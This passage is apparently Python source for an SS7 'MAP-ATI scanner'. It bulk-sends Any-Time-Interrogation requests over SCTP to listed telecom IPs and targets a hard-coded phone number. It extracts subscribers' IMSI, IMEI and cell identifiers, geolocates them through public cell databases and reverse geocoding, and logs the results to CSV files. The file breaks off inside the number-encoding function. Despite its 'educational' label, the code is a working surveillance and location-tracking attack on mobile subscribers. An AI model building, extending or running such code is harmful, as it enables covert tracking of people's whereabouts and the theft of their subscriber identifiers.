#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MAP-ATI Scanner Professional v5.0 - Auto Config Version with Real-time Logging
==============================================================================
Author: donex1888
Date: 2025-06-06 02:19:30 UTC
Status: Auto Configuration with Batch Processing and Real-time File Logging
Description: Automated MAP Any-Time-Interrogation scanner with real-time data extraction and logging
License: Educational/Research Use Only

Enhanced Features:
- Auto Configuration Mode
- Real-time file logging (extracted data, hex, raw, errors, locations)
- Enhanced PDU/SCCP transmission display
- Background location services to avoid delays
- Legendary scan result display
- Immediate data preservation
"""

import socket
import struct
import os
import sys
import time
import random
import logging
import threading
import json
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any, Union, Set
from copy import deepcopy
import ipaddress
import queue

# Enhanced UI Libraries
try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.tree import Tree
    from rich.text import Text
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  Rich not available. Install with: pip install rich")

# Location Services Libraries
try:
    import requests
    from geopy.geocoders import Nominatim
    import geocoder
    LOCATION_SERVICES_AVAILABLE = True
except ImportError:
    LOCATION_SERVICES_AVAILABLE = False
    print("⚠️  Location services not available. Install with: pip install requests geopy geocoder")

# ================================
# AUTO CONFIGURATION
# ================================

AUTO_CONFIG = {
    'TARGET_PORT': 2905,
    'DEFAULT_MSISDN': '212681364829',
    'IPS_FILE': 'ips.txt',
    'BATCH_SIZE': 20,
    'OUTPUT_DIR': 'scan_results',
    'TIMEOUT': 10,
    'WORKERS': 10,
    'CGPA_GT': '212600000001'
}

# ================================
# VERSION AND BUILD INFORMATION
# ================================

VERSION = "5.0"
BUILD_DATE = "2025-06-06 02:19:30 UTC"
AUTHOR = "donex1888"
STATUS = "Auto Configuration with Real-time File Logging"
SCAN_ID = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

# ================================
# REAL-TIME FILE LOGGING SYSTEM
# ================================

class RealTimeLogger:
    """Real-time file logging system for immediate data preservation"""
    
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.files = {}
        self.locks = {}
        self.location_queue = queue.Queue()
        self.location_thread = None
        self.setup_files()
        self.start_background_location_service()
    
    def setup_files(self):
        """Setup all real-time logging files"""
        file_configs = {
            'extracted_data': 'extracted_data.csv',
            'hex_responses': 'hex_responses.txt',
            'raw_responses': 'raw_responses.bin',
            'errors': 'errors.txt',
            'locations': 'locations.csv',
            'transmission_log': 'transmission_log.txt'
        }
        
        for file_type, filename in file_configs.items():
            file_path = self.output_dir / filename
            self.files[file_type] = file_path
            self.locks[file_type] = threading.Lock()
        
        # Initialize CSV headers
        self.init_csv_headers()
        
        logger.info(f"Real-time logging files initialized in {self.output_dir}")
    
    def init_csv_headers(self):
        """Initialize CSV file headers"""
        # Extracted data CSV header
        with self.locks['extracted_data']:
            with open(self.files['extracted_data'], 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'timestamp', 'target_ip', 'target_port', 'msisdn', 'imsi', 'imei', 
                    'mcc', 'mnc', 'lac', 'cell_id', 'operator_name', 'country', 
                    'subscriber_state', 'vlr_number', 'msc_number', 'response_time_ms'
                ])
        
        # Locations CSV header
        with self.locks['locations']:
            with open(self.files['locations'], 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'timestamp', 'target_ip', 'mcc', 'mnc', 'lac', 'cell_id', 
                    'operator_name', 'country', 'latitude', 'longitude', 
                    'address', 'city', 'accuracy', 'data_source'
                ])
    
    def log_extracted_data(self, result: 'EnhancedScanResult'):
        """Log extracted data immediately"""
        if result.result.value != 'success':
            return
        
        try:
            with self.locks['extracted_data']:
                with open(self.files['extracted_data'], 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        result.timestamp,
                        result.target.ip,
                        result.target.port,
                        result.target.msisdn,
                        result.subscriber_info.imsi or '',
                        result.subscriber_info.imei or '',
                        result.location_info.mcc or '',
                        result.location_info.mnc or '',
                        result.location_info.lac or 0,
                        result.location_info.cell_id or 0,
                        result.location_info.operator_name or '',
                        result.location_info.country or '',
                        result.subscriber_info.subscriber_state or '',
                        result.location_info.vlr_number or '',
                        result.location_info.msc_number or '',
                        result.response_time_ms
                    ])
                    
            logger.debug(f"Extracted data logged for {result.target.ip}")
            
        except Exception as e:
            logger.error(f"Failed to log extracted data: {e}")
    
    def log_hex_response(self, target_ip: str, response_hex: str):
        """Log hex response immediately"""
        try:
            with self.locks['hex_responses']:
                with open(self.files['hex_responses'], 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now(timezone.utc).isoformat()}] {target_ip}: {response_hex}\n")
                    
        except Exception as e:
            logger.error(f"Failed to log hex response: {e}")
    
    def log_raw_response(self, target_ip: str, response_data: bytes):
        """Log raw response immediately"""
        try:
            with self.locks['raw_responses']:
                with open(self.files['raw_responses'], 'ab') as f:
                    timestamp = datetime.now(timezone.utc).isoformat().encode('utf-8')
                    target_bytes = target_ip.encode('utf-8')
                    
                    # Write: timestamp_length + timestamp + target_length + target + data_length + data
                    f.write(struct.pack('>H', len(timestamp)))
                    f.write(timestamp)
                    f.write(struct.pack('>H', len(target_bytes)))
                    f.write(target_bytes)
                    f.write(struct.pack('>I', len(response_data)))
                    f.write(response_data)
                    
        except Exception as e:
            logger.error(f"Failed to log raw response: {e}")
    
    def log_error(self, target_ip: str, error_type: str, error_message: str, response_time_ms: float = 0):
        """Log error immediately"""
        try:
            with self.locks['errors']:
                with open(self.files['errors'], 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now(timezone.utc).isoformat()}] {target_ip} - {error_type}: {error_message} (Response time: {response_time_ms:.1f}ms)\n")
                    
        except Exception as e:
            logger.error(f"Failed to log error: {e}")
    
    def log_transmission(self, target_ip: str, message: str):
        """Log transmission details immediately"""
        try:
            with self.locks['transmission_log']:
                with open(self.files['transmission_log'], 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now(timezone.utc).isoformat()}] {target_ip}: {message}\n")
                    
        except Exception as e:
            logger.error(f"Failed to log transmission: {e}")
    
    def queue_location_processing(self, result: 'EnhancedScanResult'):
        """Queue location for background processing"""
        if result.location_info.mcc and result.location_info.mnc:
            self.location_queue.put(result)
    
    def start_background_location_service(self):
        """Start background location processing service"""
        def location_worker():
            while True:
                try:
                    result = self.location_queue.get(timeout=1)
                    if result is None:  # Shutdown signal
                        break
                    
                    self.process_location_background(result)
                    self.location_queue.task_done()
                    
                except queue.Empty:
                    continue
                except Exception as e:
                    logger.error(f"Location worker error: {e}")
        
        self.location_thread = threading.Thread(target=location_worker, daemon=True)
        self.location_thread.start()
        logger.debug("Background location service started")
    
    def process_location_background(self, result: 'EnhancedScanResult'):
        """Process location in background to avoid delays"""
        try:
            # Generate enhanced location data with external services
            enhanced_location = generate_enhanced_location_data(
                result.location_info.mcc,
                result.location_info.mnc,
                result.location_info.lac,
                result.location_info.cell_id,
                result.unique_id
            )
            
            # Log location data
            with self.locks['locations']:
                with open(self.files['locations'], 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        result.timestamp,
                        result.target.ip,
                        enhanced_location.mcc,
                        enhanced_location.mnc,
                        enhanced_location.lac,
                        enhanced_location.cell_id,
                        enhanced_location.operator_name,
                        enhanced_location.country,
                        enhanced_location.coordinates[0] if enhanced_location.coordinates else '',
                        enhanced_location.coordinates[1] if enhanced_location.coordinates else '',
                        enhanced_location.address,
                        enhanced_location.city,
                        enhanced_location.location_accuracy,
                        ', '.join(enhanced_location.data_sources)
                    ])
            
            logger.debug(f"Background location processed for {result.target.ip}")
            
        except Exception as e:
            logger.error(f"Background location processing failed: {e}")
    
    def shutdown(self):
        """Shutdown the logging system"""
        if self.location_thread and self.location_thread.is_alive():
            self.location_queue.put(None)  # Shutdown signal
            self.location_thread.join(timeout=5)

# ================================
# ENHANCED COLOR SYSTEM
# ================================

class Colors:
    # Basic colors with Rich fallback
    if RICH_AVAILABLE:
        RESET = ''
        RED = '[red]'
        GREEN = '[green]'
        YELLOW = '[yellow]'
        BLUE = '[blue]'
        MAGENTA = '[magenta]'
        CYAN = '[cyan]'
        WHITE = '[white]'
        BRIGHT_RED = '[bright_red]'
        BRIGHT_GREEN = '[bright_green]'
        BRIGHT_YELLOW = '[bright_yellow]'
        BRIGHT_BLUE = '[bright_blue]'
        BRIGHT_CYAN = '[bright_cyan]'
        BOLD = '[bold]'
        DIM = '[dim]'
    else:
        # Fallback ANSI colors
        RESET = '\033[0m'
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        BRIGHT_RED = '\033[91m'
        BRIGHT_GREEN = '\033[92m'
        BRIGHT_YELLOW = '\033[93m'
        BRIGHT_BLUE = '\033[94m'
        BRIGHT_CYAN = '\033[96m'
        BOLD = '\033[1m'
        DIM = '\033[2m'

# ================================
# PROTOCOL CONSTANTS & ENUMS
# ================================

class MapOperations:
    """MAP Operation Codes according to 3GPP TS 29.002"""
    UPDATE_LOCATION = 2
    CANCEL_LOCATION = 3
    PURGE_MS = 67
    SEND_IDENTIFICATION = 55
    UPDATE_GPRS_LOCATION = 23
    PROVIDE_SUBSCRIBER_INFO = 70
    ANY_TIME_INTERROGATION = 71
    ANY_TIME_SUBSCRIPTION_INTERROGATION = 62
    NOTE_SUBSCRIBER_DATA_MODIFIED = 5

class SSN:
    """SubSystem Numbers according to ITU-T Q.713"""
    HLR = 149
    VLR = 150
    MSC = 151
    SGSN = 152
    GGSN = 153
    CAP = 146
    GMLC = 147
    PCAP = 148

class AtiVariant(Enum):
    """ATI Request Variants"""
    BASIC = "basic"
    LOCATION_ONLY = "location_only"
    SUBSCRIBER_STATE = "subscriber_state"
    EQUIPMENT_INFO = "equipment_info"
    ALL_INFO = "all_info"
    MINIMAL = "minimal"

class ScanResult(Enum):
    """Enhanced Scan Result Types"""
    SUCCESS = "success"
    TIMEOUT = "timeout"
    CONNECTION_REFUSED = "connection_refused"
    NETWORK_ERROR = "network_error"
    PROTOCOL_ERROR = "protocol_error"
    MAP_ERROR = "map_error"
    BUILD_ERROR = "build_error"
    TCAP_ANALYSIS_ERROR = "tcap_analysis_error"
    MAP_ANALYSIS_ERROR = "map_analysis_error"
    UNKNOWN_ERROR = "unknown_error"

# ================================
# DATABASE LOADING FUNCTIONS
# ================================

def load_external_database(filename: str) -> Dict:
    """Load external database from JSON file"""
    try:
        file_path = Path(filename)
        if file_path.exists():
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            print(f"⚠️ Database file not found: {filename}")
            return {}
    except Exception as e:
        print(f"❌ Failed to load database {filename}: {e}")
        return {}

# Load external databases
OPERATOR_DATABASE = load_external_database('operator_database.json')
COUNTRY_CODES = load_external_database('country_codes.json')
MAP_ERROR_CODES = load_external_database('map_error_codes.json')

# Fallback data if external files not found
if not OPERATOR_DATABASE:
    OPERATOR_DATABASE = {
        "602": {
            "01": {"name": "Vodafone Egypt", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Egypt"},
            "02": {"name": "Orange Egypt", "technology": ["GSM", "UMTS", "LTE"], "country": "Egypt"},
            "03": {"name": "Etisalat Misr", "technology": ["GSM", "UMTS", "LTE"], "country": "Egypt"},
        },
        "420": {
            "01": {"name": "STC Saudi Arabia", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Saudi Arabia"},
            "03": {"name": "Mobily", "technology": ["GSM", "UMTS", "LTE", "5G"], "country": "Saudi Arabia"},
        }
    }

if not COUNTRY_CODES:
    COUNTRY_CODES = {
        "602": "Egypt", "420": "Saudi Arabia", "424": "UAE", "604": "Morocco",
        "603": "Algeria", "605": "Tunisia", "416": "Jordan", "418": "Iraq",
        "425": "Palestine", "415": "Lebanon", "417": "Syria"
    }

if not MAP_ERROR_CODES:
    MAP_ERROR_CODES = {
        "1": "Unknown Subscriber",
        "3": "Unknown MSC",
        "27": "Absent Subscriber",
        "46": "ATI Not Allowed"
    }

# ================================
# ENHANCED DATA STRUCTURES
# ================================

@dataclass
class LocationInfo:
    """Enhanced location information structure"""
    mcc: str = ""
    mnc: str = ""
    lac: int = 0
    cell_id: int = 0
    coordinates: Optional[Tuple[float, float]] = None
    address: str = ""
    country: str = ""
    city: str = ""
    operator_name: str = ""
    technology: List[str] = field(default_factory=list)
    google_maps_url: str = ""
    location_accuracy: str = "unknown"
    data_sources: List[str] = field(default_factory=list)
    vlr_number: str = ""
    msc_number: str = ""
    age_of_location: Optional[int] = None
    raw_cgi: str = ""

@dataclass
class SubscriberInfo:
    """Enhanced subscriber information structure"""
    imsi: str = ""
    msisdn: str = ""
    subscriber_state: str = ""
    equipment_status: str = ""
    imei: str = ""
    hlr_number: str = ""
    subscription_data: Dict[str, Any] = field(default_factory=dict)
    camel_data: Dict[str, Any] = field(default_factory=dict)

@dataclass
class TcapAnalysis:
    """TCAP analysis results"""
    message_type: str = ""
    transaction_id: str = ""
    components: List[Dict[str, Any]] = field(default_factory=list)
    dialogue_portion: Dict[str, Any] = field(default_factory=dict)
    application_context: str = ""
    protocol_version: int = 0
    user_information: Dict[str, Any] = field(default_factory=dict)
    raw_structure: Dict[str, Any] = field(default_factory=dict)
    analysis_success: bool = False
    error_message: str = ""

@dataclass
class MapAnalysis:
    """MAP analysis results"""
    operation_code: Optional[int] = None
    parameter_analysis: Dict[str, Any] = field(default_factory=dict)
    result_analysis: Dict[str, Any] = field(default_factory=dict)
    error_analysis: Dict[str, Any] = field(default_factory=dict)
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    analysis_success: bool = False
    error_message: str = ""

@dataclass
class TargetInfo:
    """Enhanced target information structure"""
    ip: str
    port: int
    msisdn: str
    description: str = ""
    network_info: Dict[str, Any] = field(default_factory=dict)
    
    def __str__(self):
        return f"{self.ip}:{self.port} -> {self.msisdn}"

@dataclass 
class EnhancedScanResult:
    """Complete enhanced scan result structure"""
    # Basic information
    target: TargetInfo
    result: ScanResult
    timestamp: str
    scan_id: str
    unique_id: str
    
    # Response data
    response_time_ms: float = 0.0
    response_data: Optional[bytes] = None
    response_hex: str = ""
    message_size: int = 0
    
    # Error information
    error_message: str = ""
    map_error_code: Optional[int] = None
    map_error_message: str = ""
    
    # Protocol analysis
    tcap_analysis: TcapAnalysis = field(default_factory=TcapAnalysis)
    map_analysis: MapAnalysis = field(default_factory=MapAnalysis)
    
    # Extracted information
    location_info: LocationInfo = field(default_factory=LocationInfo)
    subscriber_info: SubscriberInfo = field(default_factory=SubscriberInfo)
    
    # Technical details
    ati_variant: str = ""
    otid: str = ""
    invoke_id: Optional[int] = None
    
    # Additional metadata
    additional_info: Dict[str, Any] = field(default_factory=dict)
    diagnostic_info: Dict[str, Any] = field(default_factory=dict)

# ================================
# DEPENDENCY LOADING WITH ENHANCED VERIFICATION
# ================================

def print_professional_banner():
    """Print enhanced professional banner"""
    if RICH_AVAILABLE:
        console = Console()
        
        banner_text = f"""
╔═════════════════════════════════════════════════════════════════════════════════════════════╗
║                    🎯 MAP-ATI SCANNER PROFESSIONAL v{VERSION}                            ║
║                    AUTO CONFIG + REAL-TIME LOGGING                                     ║
╠═════════════════════════════════════════════════════════════════════════════════════════════╣
║  📅 Build: {BUILD_DATE}                                              ║
║  👤 Author: {AUTHOR}                                                          ║
║  🏗️  Status: {STATUS}                          ║
║  🆔 Scan ID: {SCAN_ID}                                               ║
╠═════════════════════════════════════════════════════════════════════════════════════════════╣
║  🔧 Enhanced Features:                                                                 ║
║     • Real-time Data Logging          • Background Location Services                  ║
║     • PDU/SCCP Transmission Display   • Legendary Scan Results                       ║
║     • Immediate File Preservation     • Network-based Location Analysis              ║
╠═════════════════════════════════════════════════════════════════════════════════════════════╣
║  ⚠️  License: Educational/Research Use Only - Professional Cellular Analysis Tool    ║
╚═════════════════════════════════════════════════════════════════════════════════════════════╝
        """
        
        console.print(Panel(
            banner_text,
            style="bold cyan",
            box=box.DOUBLE_EDGE
        ))
    else:
        # Fallback ASCII banner
        print(f"""
{'='*90}
🎯 MAP-ATI SCANNER PROFESSIONAL v{VERSION} - AUTO CONFIG + REAL-TIME LOGGING
{'='*90}
📅 Build: {BUILD_DATE}
👤 Author: {AUTHOR}
🏗️ Status: {STATUS}
🆔 Scan ID: {SCAN_ID}
{'='*90}
""")

# Enhanced dependency verification
print_professional_banner()

if RICH_AVAILABLE:
    console = Console()
    console.print("🔧 [yellow]Loading and verifying enhanced modules...[/yellow]")
else:
    print("🔧 Loading and verifying enhanced modules...")

# Global module variables
PYCRATE_AVAILABLE = False
MAP_MODULE = None
MAP_MS = None
TCAP_MSGS = None
SCCP_MODULE = None
SCTP_AVAILABLE = False

# Enhanced Pycrate loading with detailed verification
try:
    if RICH_AVAILABLE:
        console.print("📦 [cyan]Loading pycrate ASN.1 modules...[/cyan]")
    else:
        print("📦 Loading pycrate ASN.1 modules...")
    
    # Load MAP from TCAP_MAPv2v3
    from pycrate_asn1dir import TCAP_MAPv2v3
    MAP_MODULE = TCAP_MAPv2v3
    MAP_MS = MAP_MODULE.MAP_MS_DataTypes
    
    # Verify critical MAP components
    required_map_components = [
        'AnyTimeInterrogationArg', 'AnyTimeInterrogationRes',
        'LocationInformation', 'SubscriberInfo'
    ]
    
    for component in required_map_components:
        if hasattr(MAP_MS, component):
            if RICH_AVAILABLE:
                console.print(f"  ✅ [green]{component} verified[/green]")
            else:
                print(f"  ✅ {component} verified")
        else:
            raise ImportError(f"{component} not found in MAP_MS_DataTypes")
    
    # Load TCAP from TCAP2
    from pycrate_asn1dir import TCAP2
    TCAP_MSGS = TCAP2.TCAPMessages
    
    # Verify TCAP components
    required_tcap = ['Invoke', 'Component', 'Begin', 'End', 'Continue', 'Abort', 'TCMessage']
    for component in required_tcap:
        if hasattr(TCAP_MSGS, component):
            if RICH_AVAILABLE:
                console.print(f"  ✅ [green]{component} verified[/green]")
            else:
                print(f"  ✅ {component} verified")
        else:
            raise ImportError(f"{component} not found in TCAPMessages")
    
    # Load SCCP
    from pycrate_mobile import SCCP
    SCCP_MODULE = SCCP
    
    # Load additional MAP modules for enhanced analysis
    from pycrate_mobile import TS29002_MAPIE as MAPIE
    
    PYCRATE_AVAILABLE = True
    if RICH_AVAILABLE:
        console.print("✅ [bright_green]All pycrate modules loaded and verified[/bright_green]")
    else:
        print("✅ All pycrate modules loaded and verified")
    
except ImportError as e:
    if RICH_AVAILABLE:
        console.print(f"❌ [red]Pycrate import failed: {e}[/red]")
        console.print("📋 [yellow]Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile[/yellow]")
    else:
        print(f"❌ Pycrate import failed: {e}")
        print("📋 Install with: pip install pycrate pycrate-asn1rt pycrate-asn1dir pycrate-mobile")
    PYCRATE_AVAILABLE = False

# Enhanced SCTP verification
try:
    if RICH_AVAILABLE:
        console.print("📦 [cyan]Loading SCTP support...[/cyan]")
    else:
        print("📦 Loading SCTP support...")
    
    import sctp
    
    # Verify SCTP functionality
    test_sock = sctp.sctpsocket_tcp(socket.AF_INET)
    test_sock.close()
    
    SCTP_AVAILABLE = True
    if RICH_AVAILABLE:
        console.print("✅ [green]SCTP support loaded and verified[/green]")
    else:
        print("✅ SCTP support loaded and verified")
    
except ImportError:
    if RICH_AVAILABLE:
        console.print("❌ [red]SCTP support not available[/red]")
        console.print("📋 [yellow]Install with: pip install pysctp[/yellow]")
    else:
        print("❌ SCTP support not available")
        print("📋 Install with: pip install pysctp")
    SCTP_AVAILABLE = False
except Exception as e:
    if RICH_AVAILABLE:
        console.print(f"❌ [red]SCTP verification failed: {e}[/red]")
    else:
        print(f"❌ SCTP verification failed: {e}")
    SCTP_AVAILABLE = False

# Final dependency check
if not PYCRATE_AVAILABLE or not SCTP_AVAILABLE:
    if RICH_AVAILABLE:
        console.print("❌ [red]Critical dependencies missing. Cannot continue.[/red]")
    else:
        print("❌ Critical dependencies missing. Cannot continue.")
    sys.exit(1)

if RICH_AVAILABLE:
    console.print("🎉 [bright_green]All dependencies verified successfully![/bright_green]")
    console.print("─" * 90)
else:
    print("🎉 All dependencies verified successfully!")
    print("─" * 90)

# ================================
# ENHANCED LOGGING SYSTEM
# ================================

class ProfessionalFormatter(logging.Formatter):
    """Professional formatter with enhanced styling"""
    
    FORMATS = {
        logging.DEBUG: "%(asctime)s [DBG] %(name)s: %(message)s",
        logging.INFO: "%(asctime)s [INF] %(name)s: %(message)s",
        logging.WARNING: "%(asctime)s [WRN] %(name)s: %(message)s",
        logging.ERROR: "%(asctime)s [ERR] %(name)s: %(message)s",
        logging.CRITICAL: "%(asctime)s [CRT] %(name)s: %(message)s"
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno, self.FORMATS[logging.INFO])
        formatter = logging.Formatter(log_fmt, datefmt='%H:%M:%S')
        return formatter.format(record)

def setup_professional_logging(level: str = "INFO", log_file: Optional[str] = None) -> logging.Logger:
    """Setup professional logging system"""
    logger = logging.getLogger('MAP_ATI_Professional')
    logger.setLevel(getattr(logging, level.upper()))
    
    # Clear existing handlers
    logger.handlers.clear()
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(ProfessionalFormatter())
    logger.addHandler(console_handler)
    
    # File handler if specified
    if log_file:
        # Create logs directory
        log_path = Path(log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)
        
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(name)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
        logger.addHandler(file_handler)
        logger.info(f"Professional logging initialized: {log_file}")
    
    return logger

# Initialize logger
logger = setup_professional_logging()

# ================================
# OPERATOR AND LOCATION INTELLIGENCE
# ================================

def lookup_operator_info(mcc: str, mnc: str) -> Dict[str, Any]:
    """Enhanced operator lookup with comprehensive information"""
    try:
        if mcc in OPERATOR_DATABASE and mnc in OPERATOR_DATABASE[mcc]:
            operator_info = OPERATOR_DATABASE[mcc][mnc].copy()
            operator_info.update({
                'mcc': mcc,
                'mnc': mnc,
                'plmn_id': f"{mcc}{mnc}",
                'country_code': mcc,
                'is_known': True
            })
            return operator_info
        
        # Fallback for unknown operators
        country = COUNTRY_CODES.get(mcc, "Unknown Country")
        return {
            'mcc': mcc,
            'mnc': mnc,
            'name': f'Unknown Operator ({mcc}-{mnc})',
            'country': country,
            'technology': ['Unknown'],
            'plmn_id': f"{mcc}{mnc}",
            'country_code': mcc,
            'is_known': False
        }
        
    except Exception as e:
        logger.error(f"Operator lookup failed for {mcc}-{mnc}: {e}")
        return {
            'mcc': mcc,
            'mnc': mnc,
            'name': 'Lookup Failed',
            'country': 'Unknown',
            'technology': ['Unknown'],
            'error': str(e),
            'is_known': False
        }

def query_opencellid(mcc: str, mnc: str, lac: int, cell_id: int) -> Optional[Tuple[float, float]]:
    """Query OpenCellID database for cell location"""
    if not LOCATION_SERVICES_AVAILABLE:
        return None
    
    try:
        # OpenCellID API endpoint (requires API key for production use)
        url = "https://us1.unwiredlabs.com/v2/process.php"
        
        # Note: In production, you would need a proper API key
        payload = {
            "token": "your_opencellid_token",  # Replace with actual token
            "radio": "gsm",
            "mcc": int(mcc),
            "mnc": int(mnc),
            "cells": [{
                "lac": lac,
                "cid": cell_id
            }]
        }
        
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'ok' and 'lat' in data and 'lon' in data:
                return (float(data['lat']), float(data['lon']))
    
    except Exception as e:
        logger.debug(f"OpenCellID query failed: {e}")
    
    return None

def query_mozilla_location(mcc: str, mnc: str, lac: int, cell_id: int) -> Optional[Tuple[float, float]]:
    """Query Mozilla Location Services for cell location"""
    if not LOCATION_SERVICES_AVAILABLE:
        return None
    
    try:
        # Mozilla Location Service API
        url = "https://location.services.mozilla.com/v1/geolocate?key=test"
        
        payload = {
            "cellTowers": [{
                "mobileCountryCode": int(mcc),
                "mobileNetworkCode": int(mnc),
                "locationAreaCode": lac,
                "cellId": cell_id
            }]
        }
        
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'location' in data:
                location = data['location']
                return (float(location['lat']), float(location['lng']))
    
    except Exception as e:
        logger.debug(f"Mozilla location query failed: {e}")
    
    return None

def estimate_location_from_lac(mcc: str, mnc: str, lac: int) -> Optional[Tuple[float, float]]:
    """Estimate approximate location based on LAC and operator knowledge"""
    try:
        # Basic geographical estimates for major operators
        # This is a simplified approach - in production you'd use more sophisticated methods
        
        operator_info = lookup_operator_info(mcc, mnc)
        country = operator_info.get('country', '').lower()
        
        # Very basic country center coordinates (for demonstration)
        country_centers = {
            'egypt': (26.8206, 30.8025),
            'saudi arabia': (23.8859, 45.0792),
            'uae': (23.4241, 53.8478),
            'morocco': (31.7917, -7.0926),
            'algeria': (28.0339, 1.6596),
            'tunisia': (33.8869, 9.5375),
            'jordan': (30.5852, 36.2384),
            'iraq': (33.2232, 43.6793),
            'palestine': (31.9522, 35.2332),
            'lebanon': (33.8547, 35.8623),
            'syria': (34.8021, 38.9968)
        }
        
        if country in country_centers:
            # Add some random offset based on LAC for variation
            base_lat, base_lon = country_centers[country]
            lat_offset = (lac % 100 - 50) * 0.01  # Small random offset
            lon_offset = ((lac * 7) % 100 - 50) * 0.01
            
            return (base_lat + lat_offset, base_lon + lon_offset)
    
    except Exception as e:
        logger.debug(f"LAC-based location estimation failed: {e}")
    
    return None

def generate_enhanced_location_data(mcc: str, mnc: str, lac: int, cell_id: int, unique_id: str) -> LocationInfo:
    """Generate comprehensive location data with multiple sources"""
    location_info = LocationInfo(
        mcc=mcc,
        mnc=mnc,
        lac=lac,
        cell_id=cell_id,
        raw_cgi=f"{mcc}-{mnc}-{lac:04X}-{cell_id:04X}"
    )
    
    try:
        # Get operator information
        operator_info = lookup_operator_info(mcc, mnc)
        location_info.operator_name = operator_info.get('name', 'Unknown')
        location_info.technology = operator_info.get('technology', [])
        location_info.country = operator_info.get('country', 'Unknown')
        
        # Try to get coordinates from various sources
        coordinates = None
        
        # Source 1: OpenCellID
        if LOCATION_SERVICES_AVAILABLE:
            coordinates = query_opencellid(mcc, mnc, lac, cell_id)
            if coordinates:
                location_info.data_sources.append('OpenCellID')
                location_info.location_accuracy = 'high'
        
        # Source 2: Mozilla Location Services
        if not coordinates and LOCATION_SERVICES_AVAILABLE:
            coordinates = query_mozilla_location(mcc, mnc, lac, cell_id)
            if coordinates:
                location_info.data_sources.append('Mozilla')
                location_info.location_accuracy = 'medium'
        
        # Source 3: LAC-based estimation
        if not coordinates:
            coordinates = estimate_location_from_lac(mcc, mnc, lac)
            if coordinates:
                location_info.data_sources.append('LAC_Estimation')
                location_info.location_accuracy = 'low'
        
        # Process coordinates if found
        if coordinates:
            lat, lon = coordinates
            location_info.coordinates = coordinates
            location_info.google_maps_url = f"https://maps.google.com/?q={lat},{lon}"
            
            # Get address information using reverse geocoding
            if LOCATION_SERVICES_AVAILABLE:
                try:
                    geolocator = Nominatim(user_agent=f"map_ati_scanner_{unique_id}")
                    location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
                    if location:
                        location_info.address = location.address
                        address_parts = location.raw.get('address', {})
                        location_info.city = (
                            address_parts.get('city') or 
                            address_parts.get('town') or 
                            address_parts.get('village') or 
                            'Unknown City'
                        )
                        if not location_info.country or location_info.country == 'Unknown':
                            location_info.country = address_parts.get('country', 'Unknown')
                
                except Exception as e:
                    logger.debug(f"[{unique_id}] Reverse geocoding failed: {e}")
        
        logger.debug(f"[{unique_id}] Location data generated: {location_info.operator_name} in {location_info.country}")
        
    except Exception as e:
        logger.error(f"[{unique_id}] Enhanced location data generation failed: {e}")
    
    return location_info

# ================================
# ENHANCED PROTOCOL ANALYSIS ENGINE - DO NOT MODIFY THESE FUNCTIONS
# ================================

def decode_mcc_mnc_from_bcd(bcd_bytes: bytes) -> Tuple[str, str]:
    """Decode MCC/MNC from BCD format according to 3GPP TS 24.008"""
    try:
        if len(bcd_bytes) < 3:
            return "000", "00"
        
        # BCD decoding for MCC/MNC (3 bytes)
        # Byte 0: MCC digit 2 | MCC digit 1
        # Byte 1: MNC digit 3 | MCC digit 3  
        # Byte 2: MNC digit 2 | MNC digit 1
        
        mcc_digit1 = bcd_bytes[0] & 0x0F
        mcc_digit2 = (bcd_bytes[0] & 0xF0) >> 4
        mcc_digit3 = bcd_bytes[1] & 0x0F
        
        mnc_digit3 = (bcd_bytes[1] & 0xF0) >> 4
        mnc_digit1 = bcd_bytes[2] & 0x0F
        mnc_digit2 = (bcd_bytes[2] & 0xF0) >> 4
        
        mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
        
        # Check if MNC is 2 or 3 digits
        if mnc_digit3 == 0xF:
            mnc = f"{mnc_digit1}{mnc_digit2:01d}"
        else:
            mnc = f"{mnc_digit3}{mnc_digit1}{mnc_digit2}"
        
        return mcc, mnc
        
    except Exception as e:
        logger.error(f"MCC/MNC BCD decoding failed: {e}")
        return "000", "00"

# DO NOT MODIFY - Working PDU Functions from Reference Script
def format_msisdn_bcd(msisdn: str) -> bytes:
    """BCD encode MSISDN - DO NOT MODIFY"""
    digits = msisdn.replace('+', '').replace(' ', '').replace('-', '')
    
    if len(digits) % 2:
        digits += "F"
    
